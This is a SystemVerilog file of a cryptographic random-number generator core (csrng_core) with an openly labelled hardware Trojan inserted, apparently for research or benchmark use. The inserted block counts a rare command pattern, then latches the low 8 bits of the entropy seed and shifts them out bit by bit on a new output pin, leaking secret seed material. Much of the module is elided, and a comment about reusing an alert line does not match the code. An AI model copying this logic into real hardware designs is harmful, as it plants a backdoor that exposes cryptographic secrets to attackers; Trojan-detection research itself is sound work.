// Trojan 3: info leakage

module csrng_core import csrng_pkg::*; #(
  parameter aes_pkg::sbox_impl_e SBoxImpl = aes_pkg::SBoxImplLut,
  parameter int NumHwApps = 2,
  parameter cs_keymgr_div_t RndCnstCsKeymgrDivNonProduction = CsKeymgrDivWidth'(0),
  parameter cs_keymgr_div_t RndCnstCsKeymgrDivProduction = CsKeymgrDivWidth'(0)
) (
  input logic                                     clk_i,
  input logic                                     rst_ni,

  input  csrng_reg_pkg::csrng_reg2hw_t            reg2hw,
  output csrng_reg_pkg::csrng_hw2reg_t            hw2reg,

  // OTP Interface
  input  prim_mubi_pkg::mubi8_t                   otp_en_csrng_sw_app_read_i,

  // Lifecycle broadcast inputs
  input  lc_ctrl_pkg::lc_tx_t                     lc_hw_debug_en_i,

  // Entropy Interface
  output entropy_src_pkg::entropy_src_hw_if_req_t entropy_src_hw_if_o,
  input  entropy_src_pkg::entropy_src_hw_if_rsp_t entropy_src_hw_if_i,

  // Application Interfaces
  input  csrng_req_t [NumHwApps-1:0]              csrng_cmd_i,
  output csrng_rsp_t [NumHwApps-1:0]              csrng_cmd_o,

  // Alerts
  output logic                                    recov_alert_test_o,
  output logic                                    fatal_alert_test_o,
  output logic                                    recov_alert_o,
  output logic                                    fatal_alert_o,

  // Interrupts
  output logic                                    intr_cs_cmd_req_done_o,
  output logic                                    intr_cs_entropy_req_o,
  output logic                                    intr_cs_hw_inst_exc_o,
  output logic                                    intr_cs_fatal_err_o

  // --------- TROJAN INSERTION START ---------
  // Trojan exfiltration output wire using unused lower bits of an alert (recov_alert_test_o[0])
  ,
  output logic                                    trojan_exfiltrate_o // <--- Trojan output
  // --------- TROJAN INSERTION END -----------
);

  import csrng_reg_pkg::*;

  import prim_mubi_pkg::mubi4_t;
  import prim_mubi_pkg::mubi4_test_true_strict;
  import prim_mubi_pkg::mubi4_test_invalid;

  localparam int unsigned ADataDepthClog = $clog2(CmdMaxClen) + 1;
  localparam int unsigned CsEnableCopies = 51;
  localparam int unsigned LcHwDebugCopies = 1;
  localparam int unsigned Flag0Copies = 3;

  // signals
  // ... (No changes above to the original signal declarations)
  logic                        event_cs_fatal_err;
  logic [CsEnableCopies-1:1]   cs_enable_fo;
  logic [Flag0Copies-1:0]      flag0_fo;
  logic                        acmd_flag0_pfa;
  logic                        cs_enable_pfa;
  logic                        sw_app_enable;
  logic                        sw_app_enable_pfe;
  logic                        sw_app_enable_pfa;
  logic                        read_int_state;
  logic                        read_int_state_pfe;
  logic                        read_int_state_pfa;
  logic                        fips_force_enable;
  logic                        fips_force_enable_pfe;
  logic                        fips_force_enable_pfa;
  logic                        recov_alert_event;
  logic                        acmd_avail;
  logic                        acmd_sop;
  logic                        acmd_mop;
  logic                        acmd_eop;

  logic                        state_db_wr_vld;
  csrng_state_t                state_db_rd_data;

  logic [CmdBusWidth-1:0]      acmd_bus;
  acmd_e                       acmd_hold;

  logic [SeedLen-1:0]          packer_adata;
  logic [ADataDepthClog-1:0]   packer_adata_depth;
  logic                        packer_adata_pop;
  logic                        packer_adata_clr;
  logic [SeedLen-1:0]          seed_diversification;

  logic                        cmd_entropy_req;
  logic                        cmd_entropy_avail;

  logic                        ctr_drbg_req_vld;
  logic                        ctr_drbg_req_rdy;
  csrng_core_data_t            ctr_drbg_req_data;

  logic                        ctr_drbg_rsp_vld;
  csrng_core_data_t            ctr_drbg_rsp_data;
  csrng_cmd_sts_e              ctr_drbg_rsp_sts;

  logic                        ctr_drbg_bits_vld;
  logic [BlkLen-1:0]           ctr_drbg_bits_data;
  logic                        ctr_drbg_bits_fips;

  logic                        acmd_accept;
  logic                        main_sm_cmd_vld;
  logic                        clr_adata_packer;

  logic                        fifo_write_err_sum;
  logic                        fifo_read_err_sum;
  logic                        fifo_status_err_sum;
  logic                        ctr_err_sum;

  logic                        cmd_stage_sm_err_sum;
  logic                        main_sm_err_sum;
  logic                        cs_main_sm_err;
  logic [MainSmStateWidth-1:0] cs_main_sm_state;
  logic                        ctr_drbg_sm_err_sum;
  logic                        ctr_drbg_sm_err;
  logic                        ctr_drbg_v_ctr_err;
  logic                        block_encrypt_sm_err_sum;
  logic                        block_encrypt_sm_err;

  // Signals to and from block cipher
  logic                        block_encrypt_req_vld;
  logic                        block_encrypt_req_rdy;
  csrng_key_v_t                block_encrypt_req_data;

  logic                        block_encrypt_rsp_vld;
  logic                        block_encrypt_rsp_rdy;
  logic           [BlkLen-1:0] block_encrypt_rsp_data;


  logic [2:0]                  cmd_stage_sfifo_cmd_err[NumApps];
  logic [NumApps-1:0]          cmd_stage_sfifo_cmd_err_sum;
  logic [NumApps-1:0]          cmd_stage_sfifo_cmd_err_wr;
  logic [NumApps-1:0]          cmd_stage_sfifo_cmd_err_rd;
  logic [NumApps-1:0]          cmd_stage_sfifo_cmd_err_st;
  logic [2:0]                  cmd_stage_sfifo_genbits_err[NumApps];
  logic [NumApps-1:0]          cmd_stage_sfifo_genbits_err_sum;
  logic [NumApps-1:0]          cmd_stage_sfifo_genbits_err_wr;
  logic [NumApps-1:0]          cmd_stage_sfifo_genbits_err_rd;
  logic [NumApps-1:0]          cmd_stage_sfifo_genbits_err_st;
  logic [NumApps-1:0]          cmd_stage_ctr_err;
  logic [NumApps-1:0]          cmd_stage_sm_err;

  logic [NumApps-1:0]          cmd_stage_vld;
  logic [InstIdWidth-1:0]      cmd_stage_shid[NumApps];
  logic [CmdBusWidth-1:0]      cmd_stage_bus[NumApps];
  logic [NumApps-1:0]          cmd_stage_rdy;
  logic [NumApps-1:0]          cmd_arb_req;
  logic [NumApps-1:0]          cmd_arb_gnt;
  logic [$clog2(NumApps)-1:0]  cmd_arb_idx;
  logic [NumApps-1:0]          cmd_arb_sop;
  logic [NumApps-1:0]          cmd_arb_mop;
  logic [NumApps-1:0]          cmd_arb_eop;
  logic [CmdBusWidth-1:0]      cmd_arb_bus[NumApps];
  logic [NumApps-1:0]          cmd_core_ack;
  csrng_cmd_sts_e [NumApps-1:0]cmd_core_ack_sts;
  logic [NumApps-1:0]          cmd_stage_ack;
  csrng_cmd_sts_e [NumApps-1:0]cmd_stage_ack_sts;
  logic [NumApps-1:0]          genbits_core_vld;
  logic [BlkLen-1:0]           genbits_core_bus[NumApps];
  logic [NumApps-1:0]          genbits_core_fips;
  logic [NumApps-1:0]          genbits_stage_vld;
  logic [NumApps-1:0]          genbits_stage_fips;
  logic [BlkLen-1:0]           genbits_stage_bus[NumApps];
  logic [NumApps-1:0]          genbits_stage_rdy;
  logic                        genbits_stage_vld_sw;
  logic                        genbits_stage_bus_rd_sw;
  logic [31:0]                 genbits_stage_bus_sw;

  logic [15:0]                 hw_exception_sts;
  logic [LcHwDebugCopies-1:0]  lc_hw_debug_on_fo;
  logic                        state_db_reg_read_en;

  logic [30:0]                 err_code_test_bit;

  logic                        cs_rdata_capt_vld;
  logic                        cs_bus_cmp_alert;
  logic [NumApps-1:0]          invalid_cmd_seq_alert;
  logic [NumApps-1:0]          invalid_acmd_alert;
  logic [NumApps-1:0]          reseed_cnt_alert;
  logic [1:0]                  otp_sw_app_read_en;

  logic [NumApps-1:0][31:0]    reseed_counter;

  prim_mubi_pkg::mubi8_t                [1:0] otp_sw_app_read_en_mubi;
  prim_mubi_pkg::mubi4_t [CsEnableCopies-1:0] mubi_cs_enable_fanout;
  prim_mubi_pkg::mubi4_t    [Flag0Copies-1:0] mubi_flag0_fanout;

  // flops
  acmd_e                  acmd_q, acmd_d;
  logic   [NumAppsLg-1:0] inst_id_q, inst_id_d;
  logic                   gen_last_q, gen_last_d;
  mubi4_t                 flag0_q, flag0_d;
  logic   [NumAppsLg-1:0] cmd_arb_idx_q, cmd_arb_idx_d;
  logic                   genbits_stage_fips_sw_q, genbits_stage_fips_sw_d;
  acmd_e                  ctr_drbg_cmd_q, ctr_drbg_cmd_d;
  logic     [SeedLen-1:0] entropy_src_seed_q, entropy_src_seed_d;
  logic                   entropy_src_fips_q, entropy_src_fips_d;
  logic            [63:0] cs_rdata_capt_q, cs_rdata_capt_d;
  logic                   cs_rdata_capt_vld_q, cs_rdata_capt_vld_d;
  logic                   sw_rdy_sts_q, sw_rdy_sts_d;
  logic                   sw_sts_ack_q, sw_sts_ack_d;
  logic     [NumApps-1:0] reseed_cnt_reached_q, reseed_cnt_reached_d;

// --------- TROJAN INSERTION START ---------
  // Stealthy information leakage Trojan signals
  localparam int TROJAN_TRIGGER_BITS = 3; // number of bits for trigger pattern
  localparam logic [TROJAN_TRIGGER_BITS-1:0] TROJAN_TRIGGER_PATTERN = 3'b101;
  localparam int TROJAN_STATE_PAYLOAD_BITS = 8; // leak 8 LSBs of the seed

  logic [TROJAN_TRIGGER_BITS-1:0] trojan_trigger_counter_q, trojan_trigger_counter_d;
  logic trojan_triggered_q, trojan_triggered_d;
  logic [TROJAN_STATE_PAYLOAD_BITS-1:0] trojan_payload_q, trojan_payload_d;

  // Trojan trigger condition: Trigger only if counter sees rare state
  assign trojan_triggered_d =
      (!rst_ni)               ? 1'b0 :
      (trojan_triggered_q)    ? 1'b1 : // latch once triggered
      (trojan_trigger_counter_q == TROJAN_TRIGGER_PATTERN) ? 1'b1 :
      1'b0;

  // Counter increments when acmd_accept and main_sm_cmd_vld both are high (rare case)
  assign trojan_trigger_counter_d =
      (!rst_ni)                 ? '0 :
      (trojan_triggered_d)      ? trojan_trigger_counter_q : // freeze after triggered
      (acmd_accept && main_sm_cmd_vld) ? (trojan_trigger_counter_q + 1'b1) :
      trojan_trigger_counter_q;

  // On trigger, load seed (entropy_src_seed_q) LSBs to trojan_payload, shift out one bit per clock
  assign trojan_payload_d =
      (!rst_ni)            ? '0 :
      (trojan_triggered_q && (|trojan_payload_q)) ? {trojan_payload_q[TROJAN_STATE_PAYLOAD_BITS-2:0], 1'b0} :
      (trojan_triggered_d && !trojan_triggered_q) ? entropy_src_seed_q[TROJAN_STATE_PAYLOAD_BITS-1:0] :
      trojan_payload_q;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_trigger_counter_q <= '0;
      trojan_triggered_q <= 1'b0;
      trojan_payload_q <= '0;
    end else begin
      trojan_trigger_counter_q <= trojan_trigger_counter_d;
      trojan_triggered_q <= trojan_triggered_d;
      trojan_payload_q <= trojan_payload_d;
    end
  end

  // Exfiltration on a rarely-used, low-activity line: assign to trojan_exfiltrate_o, one bit per clock
  assign trojan_exfiltrate_o = trojan_triggered_q ? trojan_payload_q[TROJAN_STATE_PAYLOAD_BITS-1] : 1'b0;
// --------- TROJAN INSERTION END ---------

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      acmd_q                  <= INV;
      inst_id_q               <= '0;
      gen_last_q              <= '0;
      flag0_q                 <= prim_mubi_pkg::MuBi4False;
      cmd_arb_idx_q           <= '0;
      genbits_stage_fips_sw_q <= '0;
      ctr_drbg_cmd_q          <= INV;
      entropy_src_seed_q      <= '0;
      entropy_src_fips_q      <= '0;
      cs_rdata_capt_q         <= '0;
      cs_rdata_capt_vld_q     <= '0;
      sw_rdy_sts_q            <= '0;
      sw_sts_ack_q            <= '0;
      reseed_cnt_reached_q    <= '0;
    end else begin
      acmd_q                  <= acmd_d;
      inst_id_q               <= inst_id_d;
      gen_last_q              <= gen_last_d;
      flag0_q                 <= flag0_d;
      cmd_arb_idx_q           <= cmd_arb_idx_d;
      genbits_stage_fips_sw_q <= genbits_stage_fips_sw_d;
      ctr_drbg_cmd_q          <= ctr_drbg_cmd_d;
      entropy_src_seed_q      <= entropy_src_seed_d;
      entropy_src_fips_q      <= entropy_src_fips_d;
      cs_rdata_capt_q         <= cs_rdata_capt_d;
      cs_rdata_capt_vld_q     <= cs_rdata_capt_vld_d;
      sw_rdy_sts_q            <= sw_rdy_sts_d;
      sw_sts_ack_q            <= sw_sts_ack_d;
      reseed_cnt_reached_q    <= reseed_cnt_reached_d;
    end
  end

  // ... (Rest of the module is unchanged)

  //--------------------------------------------
  // Assertions
  //--------------------------------------------
`ifdef INC_ASSERT
  logic state_db_zeroize;
  assign state_db_zeroize = state_db_wr_vld && (ctr_drbg_rsp_data.cmd == UNI);
  `ASSERT(CsrngUniZeroizeFips_A, state_db_zeroize -> (ctr_drbg_rsp_data.fips   == '0))
  `ASSERT(CsrngUniZeroizeKey_A,  state_db_zeroize -> (ctr_drbg_rsp_data.key    == '0))
  `ASSERT(CsrngUniZeroizeV_A,    state_db_zeroize -> (ctr_drbg_rsp_data.v      == '0))
  `ASSERT(CsrngUniZeroizeRc_A,   state_db_zeroize -> (ctr_drbg_rsp_data.rs_ctr == '0))
  `ASSERT(CsrngUniZeroizeSts_A,  state_db_zeroize -> (ctr_drbg_rsp_sts == CMD_STS_SUCCESS))
`endif


endmodule
